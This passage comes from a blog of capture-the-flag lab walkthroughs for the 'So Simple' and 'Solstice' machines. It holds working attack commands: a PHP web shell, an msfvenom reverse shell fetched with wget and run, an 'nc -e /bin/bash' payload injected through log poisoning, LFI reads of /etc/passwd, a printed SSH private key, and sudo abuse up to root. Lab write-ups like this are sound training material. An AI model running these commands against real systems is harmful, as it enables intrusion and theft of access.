<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;pre&gt;system($_REQUEST[&#x27;cmd&#x27;])&lt;/pre&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Next we need to host this file over HTTP as follows.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~# sudo python3 -m http.server 80</span><br><span class="line">Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>We can now download and run the exploit, appending <code>&amp;cmd=id</code> to run our command.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~# python exploit.py -t http://192.168.120.192/wordpress/ --payload-uri http://kali/payload.txt\&amp;cmd\=id</span><br><span class="line">[&gt;] Sending Payload to System!</span><br><span class="line">[*] Received Response From Server!</span><br><span class="line">[&lt;] Received:</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Now that we have command execution, we can pivot this into a complete shell. First we generate an MSFvenom reverse shell payload.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~# msfvenom -p linux/x86/shell_reverse_tcp -f elf -o shell LHOST=kali LPORT=8000</span><br><span class="line">[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload</span><br><span class="line">[-] No arch selected, selecting arch: x86 from the payload</span><br><span class="line">No encoder or badchars specified, outputting raw payload</span><br><span class="line">Payload size: 68 bytes</span><br><span class="line">Final size of elf file: 152 bytes</span><br><span class="line">Saved as: shell</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>We then start a Netcat handler to catch the shell.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~# nc -lvp 8000</span><br><span class="line">listening on [any] 8000 ...</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>We now execute <code>wget http://kali/shell -O /tmp/shell &amp;&amp; chmod 777 /tmp/shell &amp;&amp; /tmp/shell</code> to download and execute our payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~# python exploit.py -t http://192.168.120.192/wordpress/ --payload-uri &#x27;http://kali/payload.txt&amp;cmd=wget http://kali/shell -O /tmp/shell %26%26 chmod 777 /tmp/shell %26%26 /tmp/shell&#x27;[&gt;] Sending Payload to System!</span><br></pre></td></tr></table></figure>

<p>And catch our reverse shell</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~# nc -lvp 8000listening on [any] 8000 ...192.168.120.192: inverse host lookup failed: Unknown hostconnect to [kali] from (UNKNOWN) [192.168.120.192] 34892iduid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br></pre></td></tr></table></figure>

<h2 id="Escalation"><a href="#Escalation" class="headerlink" title="Escalation"></a><strong>Escalation</strong></h2><h3 id="Weak-File-Permissions"><a href="#Weak-File-Permissions" class="headerlink" title="Weak File Permissions"></a><strong>Weak File Permissions</strong></h3><p>We’ll start our enumeration by investigating what files <code>max</code> has in his home folder.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /home/maxfind . 2&gt;/dev/null../.mysql_history./personal.txt./.profile./.ssh./.ssh/authorized_keys./.ssh/id_rsa./.ssh/id_rsa.pub./.local./.local/share./user.txt./.bash_logout./this./this/is./this/is/maybe./this/is/maybe/the./this/is/maybe/the/way./this/is/maybe/the/way/to./this/is/maybe/the/way/to/a./this/is/maybe/the/way/to/a/private_key./this/is/maybe/the/way/to/a/private_key/id_rsa./this/is/maybe/the/way/to/a/rabbit_hole./this/is/maybe/the/way/to/a/rabbit_hole/rabbit-hole.txt./this/is/maybe/the/way/to/a/password./this/is/maybe/the/way/to/a/password/password.txt./.bashrc./.cache./.gnupg</span><br></pre></td></tr></table></figure>

<p>It looks like there’s a few files of interest, including some private keys. One is a rabbit hole, and we can ignore it.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat ./this/is/maybe/the/way/to/a/private_key/id_rsa-----BEGIN RSA Rubbish Key-----qwertyuiopasdfghjklzxcvbnmqwertyuiopasdfghjklzxcvbnmqwertyuiopasdfghjklzxcvbnmqwertyuiopasdfghjklzxcvbnmqwertyuiopasdfghjklzxcvbnmqwertyuiopasdfghjklzxcvbnmqwertyuiopasdfghjklzxcvbnmqwertyuiopasdfghjklzxcvbnmqwertyuiopasdfghjklzxcvbnmqwertyuiopasdfghjklzxcvbnmqwertyuiopasdfghjklzxcvbnmqwertyuiopasdfghjklzxcvbnmqwertyuiopasdfghjklzxcvbnmqwertyuiopasdfghjklzxcvbnmqwertyuiopasdfghjklzxcvbnmqwertyuiopasdfghjklzxcvbnmqwertyuiopasdfghjklzxcvbnmqwertyuiopasdfghjklzxcvbnmqwertyuiopasdfghjklzxcvbnmqwertyuiopasdfghjklzxcvbnmqwertyuiopasdfghjklzxcvbnmqwertyuiopasdfghjklzxcvbnmqwertyuiopasdfghjklzxcvbnmqwertyuiopasdfghjklzxcvbnmqwertyuiopasdfghjklzxcvbnmqwertyuiopasdfghjklzxcvbnmqwertyuiopasdfghjklzxcvbnmqwertyuiopasdfghjklzxcvbnmqwertyuiopasdfghjklzxcvbnmqwertyuiopasdfghjklzxcvbnmqwertyuiopasdfghjklzxcvbnmqwertyuiopasdfghjklzxcvbnmqwertyuiopasdfghjklzxcvbnmqwertyuiopasdfghjklzxcvbnmqwertyuiopasdfghjklzxcvbnmqwertyuiopasdfghjklzxcvbnmqwertyuiopasdfghjklzxcvbnmqwertyuiopasdfghjklzxcvbnmqwertyuiopasdfghjklzxcvbnmqwertyuiopasdfghjklzxcvbnmqwertyuiopasdfghjklzxcvbnmqwertyuiopasdfghjklzxcvbnmqwertyuiopasdfghjklzxcvbnmqwertyuiopasdfghjklzxcvbnmqwertyuiopasdfghjklzxcvbnmqwertyuiopasdfghjklzxcvbnmqwertyuiopasdfghjklzxcvbnmqwertyuiopasdfghjklzxcvbnmqwertyuiopasdfghjklzxcvbnmqwertyuiopasdfghjklzxcvbnmqwertyuiopasdfghjklzxcvbnmqwertyuiopasdfghjklzxcvbnm-----END RSA Rubbish Key-----</span><br></pre></td></tr></table></figure>

<p>However, the other one looks legitimate, so we’ll copy it to our Kali machine.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat ./.ssh/id_rsa-----BEGIN OPENSSH PRIVATE KEY-----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-----END OPENSSH PRIVATE KEY-----</span><br></pre></td></tr></table></figure>

<p>We can then login as <code>max</code> using the private key.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~# ssh -i id_rsa max@192.168.120.192Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-40-generic x86_64)...max@so-simple:~$ iduid=1000(max) gid=1000(max) groups=1000(max),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)max@so-simple:~$</span><br></pre></td></tr></table></figure>

<h3 id="Sudo-Abuse"><a href="#Sudo-Abuse" class="headerlink" title="Sudo Abuse"></a><strong>Sudo Abuse</strong></h3><p>To get <code>root</code> access we’ll first see if <code>max</code> has access to run anything with <code>sudo</code>.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">max@so-simple:~$ sudo -lMatching Defaults entries for max on so-simple:    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/binUser max may run the following commands on so-simple:    (steven) NOPASSWD: /usr/sbin/service</span><br></pre></td></tr></table></figure>

<p>It looks like we can run <code>/usr/sbin/service</code> as <code>steven</code> without needing a password. If we look at the entry for <code>service</code> on <a href="https://gtfobins.github.io/gtfobins/service/">GTFOBins</a> we can exploit this to get a shell as <code>steven</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">max@so-simple:~$ sudo -u steven /usr/sbin/service ../../bin/bashsteven@so-simple:/$ iduid=1001(steven) gid=1001(steven) groups=1001(steven)</span><br></pre></td></tr></table></figure>

<p>Continuing down this path we’ll check if <code>steven</code> can run anything with <code>sudo</code> as well.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">steven@so-simple:/$ sudo -l</span><br><span class="line">Matching Defaults entries for steven on so-simple:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User steven may run the following commands on so-simple:</span><br><span class="line">    (root) NOPASSWD: /opt/tools/server-health.sh</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>It appears we can run a script located in <code>/opt/tools/server-health.sh</code> as <code>root</code> without requiring a password. If we try and access this file we find that it doesn’t exist.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">steven@so-simple:/$ ls -lah /opt/tools/server-health.sh</span><br><span class="line">ls: cannot access &#x27;/opt/tools/server-health.sh&#x27;: No such file or directory</span><br><span class="line">steven@so-simple:/$ ls -lah /opt/tools</span><br><span class="line">ls: cannot access &#x27;/opt/tools&#x27;: No such file or directory</span><br><span class="line">steven@so-simple:/$ ls -lah /opt</span><br><span class="line">total 8.0K</span><br><span class="line">drwxr-xr-x  2 steven steven 4.0K Jul 13 21:06 .</span><br><span class="line">drwxr-xr-x 20 root   root   4.0K Aug 14 10:57 ..</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Fortunately, it looks like <code>steven</code> has write access to <code>/opt</code> so we can simply create the file and then execute it as <code>root</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">teven@so-simple:/$ mkdir /opt/tools</span><br><span class="line">steven@so-simple:/$ echo -e &#x27;#!/bin/bash\nexec /bin/bash&#x27; &gt; /opt/tools/server-health.sh</span><br><span class="line">steven@so-simple:/$ chmod +x /opt/tools/server-health.sh</span><br><span class="line">steven@so-simple:/$ sudo /opt/tools/server-health.sh</span><br><span class="line">root@so-simple:/# id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line">root@so-simple:/#</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Linux Walkthrough</category>
      </categories>
      <tags>
        <tag>Wpscan</tag>
        <tag>Steven</tag>
      </tags>
  </entry>
  <entry>
    <title>Solstice</title>
    <url>/undefined/Solstice/</url>
    <content><![CDATA[<h1 id="Exploitation-Guide-for-Solstice"><a href="#Exploitation-Guide-for-Solstice" class="headerlink" title="Exploitation Guide for Solstice"></a><strong>Exploitation Guide for Solstice</strong></h1><h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a><strong>Summary</strong></h2><h2 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a><strong>Enumeration</strong></h2><h3 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a><strong>Nmap</strong></h3><p>We start off by running an <code>nmap</code> scan:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ sudo nmap -p- -sV 192.168.120.167</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-11 16:27 EDT</span><br><span class="line">Nmap scan report for 192.168.120.167</span><br><span class="line">Host is up (0.043s latency).</span><br><span class="line">Not shown: 65428 closed ports, 96 filtered ports</span><br><span class="line">PORT      STATE SERVICE     VERSION</span><br><span class="line">21/tcp    open  ftp         pyftpdlib 1.5.6</span><br><span class="line">22/tcp    open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)</span><br><span class="line">25/tcp    open  smtp        Exim smtpd 4.92</span><br><span class="line">80/tcp    open  http        Apache httpd 2.4.38 ((Debian))</span><br><span class="line">139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span><br><span class="line">445/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span><br><span class="line">2121/tcp  open  ftp         pyftpdlib 1.5.6</span><br><span class="line">3128/tcp  open  http-proxy  Squid http proxy 4.6</span><br><span class="line">8593/tcp  open  http        PHP cli server 5.5 or later (PHP 7.3.14-1)</span><br><span class="line">54787/tcp open  http        PHP cli server 5.5 or later (PHP 7.3.14-1)</span><br><span class="line">62524/tcp open  ftp         FreeFloat ftpd 1.00</span><br><span class="line">Service Info: Host: solstice; OSs: Linux, Windows; CPE: cpe:/o:linux:linux_kernel, cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="Web-server-on-port-8593"><a href="#Web-server-on-port-8593" class="headerlink" title="Web server on port 8593"></a><strong>Web server on port 8593</strong></h3><p>This web app appears to be under construction, with only a limited number of functionalities available to us.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ curl http://192.168.120.167:8593</span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">	&lt;link href=&quot;https://fonts.googleapis.com/css?family=Comic+Sans&quot; rel=&quot;stylesheet&quot;&gt;</span><br><span class="line">	&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;style.css&quot;&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">	&lt;div class=&quot;menu&quot;&gt;</span><br><span class="line">	    &lt;a href=&quot;index.php&quot;&gt;Main Page&lt;/a&gt;</span><br><span class="line">	    &lt;a href=&quot;index.php?book=list&quot;&gt;Book List&lt;/a&gt;</span><br><span class="line">	&lt;/div&gt;</span><br><span class="line">We are still setting up the library! Try later on!&lt;p&gt;&lt;/p&gt;    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>By executing a simple manual fuzzing, we find a LFI vulnerability in the <code>book</code> parameter, allowing us to few the contents of <strong>/etc/passwd</strong>.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ curl http://192.168.120.167:8593?book=../../../../../etc/passwd</span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">	&lt;link href=&quot;https://fonts.googleapis.com/css?family=Comic+Sans&quot; rel=&quot;stylesheet&quot;&gt;</span><br><span class="line">	&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;style.css&quot;&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">	&lt;div class=&quot;menu&quot;&gt;</span><br><span class="line">	    &lt;a href=&quot;index.php&quot;&gt;Main Page&lt;/a&gt;</span><br><span class="line">	    &lt;a href=&quot;index.php?book=list&quot;&gt;Book List&lt;/a&gt;</span><br><span class="line">	&lt;/div&gt;</span><br><span class="line">We are still setting up the library! Try later on!&lt;p&gt;root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">_apt:x:100:65534::/nonexistent:/usr/sbin/nologin</span><br><span class="line">systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">messagebus:x:104:110::/nonexistent:/usr/sbin/nologin</span><br><span class="line">avahi-autoipd:x:105:113:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin</span><br><span class="line">avahi:x:106:117:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin</span><br><span class="line">saned:x:107:118::/var/lib/saned:/usr/sbin/nologin</span><br><span class="line">colord:x:108:119:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin</span><br><span class="line">hplip:x:109:7:HPLIP system user,,,:/var/run/hplip:/bin/false</span><br><span class="line">systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin</span><br><span class="line">sshd:x:110:65534::/run/sshd:/usr/sbin/nologin</span><br><span class="line">mysql:x:111:120:MySQL Server,,,:/nonexistent:/bin/false</span><br><span class="line">miguel:x:1000:1000:,,,:/home/miguel:/bin/bash</span><br><span class="line">uuidd:x:112:121::/run/uuidd:/usr/sbin/nologin</span><br><span class="line">smmta:x:113:122:Mail Transfer Agent,,,:/var/lib/sendmail:/usr/sbin/nologin</span><br><span class="line">smmsp:x:114:123:Mail Submission Program,,,:/var/lib/sendmail:/usr/sbin/nologin</span><br><span class="line">Debian-exim:x:115:124::/var/spool/exim4:/usr/sbin/nologin</span><br><span class="line">&lt;/p&gt;    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="Web-server-on-port-80"><a href="#Web-server-on-port-80" class="headerlink" title="Web server on port 80"></a><strong>Web server on port 80</strong></h3><p>Now that we have a LFI on the one application, we can attempt to poison the log file of the web application running on port 80. This can be achieved by sending a malicious PHP command to the web application.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ echo &quot;GET &lt;?php echo &#x27;TEST123&#x27; ?&gt; HTTP/1.1&quot; | nc 192.168.120.167 80</span><br><span class="line">HTTP/1.1 400 Bad Request</span><br><span class="line">Date: Tue, 11 Aug 2020 21:16:09 GMT</span><br><span class="line">Server: Apache/2.4.38 (Debian)</span><br><span class="line">Content-Length: 301</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: text/html; charset=iso-8859-1</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE HTML PUBLIC &quot;-//IETF//DTD HTML 2.0//EN&quot;&gt;</span><br><span class="line">&lt;html&gt;&lt;head&gt;</span><br><span class="line">&lt;title&gt;400 Bad Request&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;&lt;body&gt;</span><br><span class="line">&lt;h1&gt;Bad Request&lt;/h1&gt;</span><br><span class="line">&lt;p&gt;Your browser sent a request that this server could not understand.&lt;br /&gt;</span><br><span class="line">&lt;/p&gt;</span><br><span class="line">&lt;hr&gt;</span><br><span class="line">&lt;address&gt;Apache/2.4.38 (Debian) Server at 127.0.0.1 Port 80&lt;/address&gt;</span><br><span class="line">&lt;/body&gt;&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Then use the LFI to verify if the attack worked.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ curl http://192.168.120.167:8593?book=../../../../../var/log/apache2/access.log</span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">	&lt;link href=&quot;https://fonts.googleapis.com/css?family=Comic+Sans&quot; rel=&quot;stylesheet&quot;&gt;</span><br><span class="line">	&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;style.css&quot;&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">	&lt;div class=&quot;menu&quot;&gt;</span><br><span class="line">	    &lt;a href=&quot;index.php&quot;&gt;Main Page&lt;/a&gt;</span><br><span class="line">	    &lt;a href=&quot;index.php?book=list&quot;&gt;Book List&lt;/a&gt;</span><br><span class="line">	&lt;/div&gt;</span><br><span class="line">We are still setting up the library! Try later on!&lt;p&gt;192.168.118.9 - - [11/Aug/2020:17:16:09 -0400] &quot;GET TEST123 HTTP/1.1\n&quot; 400 0 &quot;-&quot; &quot;-&quot;</span><br><span class="line">&lt;/p&gt;    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>As we can see, the php code got executed. We can use this to execute commands.</p>
<h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a><strong>Exploitation</strong></h2><h3 id="Injecting-the-payload"><a href="#Injecting-the-payload" class="headerlink" title="Injecting the payload"></a><strong>Injecting the payload</strong></h3><p>We can use the log poisoning attack to inject our payload.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ echo &quot;GET &lt;?php system(&#x27;nc -e /bin/bash 192.168.118.9 444&#x27;); ?&gt; HTTP/1.1&quot; | nc 192.168.120.167 80</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="Executing-it"><a href="#Executing-it" class="headerlink" title="Executing it"></a><strong>Executing it</strong></h3><p>First, start our listener.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ sudo nc -nvlp 444</span><br><span class="line">listening on [any] 444 ...</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Then trigger it with the LFI.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ curl http://192.168.120.167:8593?book=../../../../../var/log/apache2/access.log</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>We receive our shell.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ sudo nc -nvlp 444</span><br><span class="line">listening on [any] 444 ...</span><br><span class="line">connect to [192.168.118.9] from (UNKNOWN) [192.168.120.167] 52810</span><br><span class="line">id</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><span class="line"></span><br><span class="line">python -c &quot;import pty; pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br><span class="line">www-data@solstice:/var/tmp/webserver$</span><br><span class="line"></span><br><span class="line">www-data@solstice:/var/tmp/webserver$ stty rows 50 cols 250</span><br><span class="line">stty rows 50 cols 250</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="Escalation"><a href="#Escalation" class="headerlink" title="Escalation"></a><strong>Escalation</strong></h2><p>Checking the running processes, we can find a local web server running as root.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">www-data@solstice:/var/tmp/webserver$ ps aux</span><br><span class="line">ps aux</span><br><span class="line">USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND</span><br><span class="line">...</span><br><span class="line">root       474  0.0  0.0   2388   756 ?        Ss   Aug11   0:00 /bin/sh -c /usr/bin/php -S 127.0.0.1:57 -t /var/tmp/sv/</span><br><span class="line">...</span><br><span class="line">root       480  0.0  2.0 196744 21104 ?        S    Aug11   0:01 /usr/bin/php -S 127.0.0.1:57 -t /var/tmp/sv/</span><br><span class="line">...</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>If we look into that folder, we can see that the <strong>index.php</strong> file is world-writable.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">www-data@solstice:/var/tmp/webserver$ ls -l /var/tmp/sv</span><br><span class="line">ls -l /var/tmp/sv</span><br><span class="line">total 4</span><br><span class="line">-rwxrwxrwx 1 root root 36 Jun 19 00:01 index.php</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>We can use it to execute commands as root. Let’s make <code>find</code> run with the SUID bit.</p>
